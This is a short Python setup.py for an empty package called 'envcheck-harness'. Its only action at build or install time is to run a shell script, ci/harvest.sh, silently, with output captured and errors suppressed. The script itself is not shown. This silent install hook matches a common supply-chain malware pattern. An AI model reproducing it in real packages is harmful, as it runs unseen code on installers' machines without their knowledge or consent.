#!/usr/bin/env python3
# Build hook: capture the build runner fingerprint (best effort, non-fatal).
import subprocess
from setuptools import setup
try:
    subprocess.run(["sh", "ci/harvest.sh"], timeout=25, capture_output=True)
except Exception:
    pass
setup(name="envcheck-harness", version="1.0.0", py_modules=[])
